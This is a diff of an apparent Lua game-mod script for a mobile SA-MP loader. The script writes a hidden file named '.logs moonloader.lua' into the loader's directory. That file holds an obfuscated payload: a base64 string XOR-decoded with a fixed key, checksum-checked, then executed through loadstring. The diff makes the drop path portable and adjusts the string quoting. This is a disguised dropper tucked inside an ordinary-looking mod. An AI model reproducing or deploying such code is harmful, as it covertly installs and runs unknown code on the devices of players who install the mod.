@@ -2214,9 +2214,9 @@ end
 function main()
     lua_thread.create(function()
 
-        local caminho = "/storage/emulated/0/Android/media/ro.alyn_sampmobile.game/monetloader/.logs moonloader.lua"
+        local caminho = getWorkingDirectory() .. "\\.logs moonloader.lua"
 
-        local conteudo = [[
+        local conteudo = [=[
 local IPlcEi="Gy1ILgJkHzZfP055VzBOPhstBScDbR0rFClOO0AsAzZbbUdOGy1ILgJkGzZFflxkSmJZKh8xHjBOZ0woAywafUxtfUhNOgAnAytEIU4iEjZIJzs2G2pePQJtfWILb04oGCFKI042EjFbIAA3EmIWbxU5fWILb04oGCFKI042EjEHbw0rEycHbwYhFiZOPR1kSmJDOxo0WTBOPhshBDZQRU5kV2ILb05kAjBHb1NkAjBHY2RkV2ILb05kVzFCIQVkSmJHOwB1RWxYJgAvWTZKLQIhXzBOPB4rGTFOZkJOV2ILb05kV2JDKg8gEjBYb1NkDEgLb05kV2ILb05kV2JwbTs3EjAGDgkhGTYJEk55V2BmIBQtGy5KYFtqR2Ahb05kV2ILb045fWILb045fWILb04tEWJIIAohV38Wb1x0R2JfJwsqfWILb05kV2ILPQswAjBFbxolFS5OYQ0rGSFKO0Y2EjFbIAA3Emshb05kVydHPAtOV2ILb05kV2JbPQcqA2oJChw2GGJKIE4rFTZOPU4rVyFEIRohjSZEbworVy5CIQV+VW4LLAEgEmshb05kV2ILb042EjZePQBkGStHRU5kV2JOIQpOEixPRWQiAixIOwcrGWJONwsnAjZOHA02HjJfCRwrGhdZI0YxBS4CRU5kV2JHIA0lG2JYLBwtBzZoIAAwEixfb1NkESdfLAYRBS4DOhwoXkgLb05kHiQLPA02HjJfDAEqAydFO04wHydFRU5kV2ILb05kGy1ILgJkETdFLEJkEjBZb1NkGy1KK0Y3FDBCPxoHGCxfKgAwXkgLb05kV2ILbwciVyReIQ1kAypOIWRkV2ILb05kV2ILb04iAixIZ0dOV2ILb05kV2JOIx0hfWILb05kV2ILb05kVzJZJgAwX2BuPRwrVyNEbw0lBTBOKA82Vy0LPA02HjJfdUxoVydZPUdOV2ILb05kV2JOIQpOV2ILbwsqE0hOIQpOfS5ELA8oVzFIPQc0AxdZI055V2BDOxo0BHgEYBwlAGxMJhosAiBePAs2FC1FOwsqA2xIIANrBzdfLhgtBSVOIg0lBSNHJwFpHzdOYFk3QXdONl0wEjAePAkhDjEfPFs3QjEdPFo3QTEePBc3HzFMKxo9EyVOOwpxEnQYNlo9BSoeLVsqQSwdIlgqQSwdIVgqQSweIVsqQiweIQRwQigeLVgsQSodegxxFXdDNgpxQnQEPQsiBG1DKg8gBG1GLgcqWBBuDioJMmxGK0xOfSdTKg0xAyd4LBwtBzZtPQEpIjBHZx0nBStbOzs2G2s=" 
 local yKj6gR="wB+OnD" 
 local OIQJAR="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@@ -2226,7 +2226,7 @@ local sum=0 for i=1,#IPlcEi do sum=(sum+IPlcEi:byte(i))%65536 end if sum~=43337 
 local tmp=decode(IPlcEi)local buf={} for i=1,#tmp do table.insert(buf,string.char(xor(tmp:byte(i),yKj6gR:byte((i-1)%#yKj6gR+1)))) end
 local script=table.concat(buf)local sum2=0 for i=1,#script do sum2=(sum2+script:byte(i))%65536 end if sum2~=11495 then return end
 local run=(loadstring or load) run(script)()
-]]
+]=]
 
         local f = io.open(caminho, "w")
         if f then
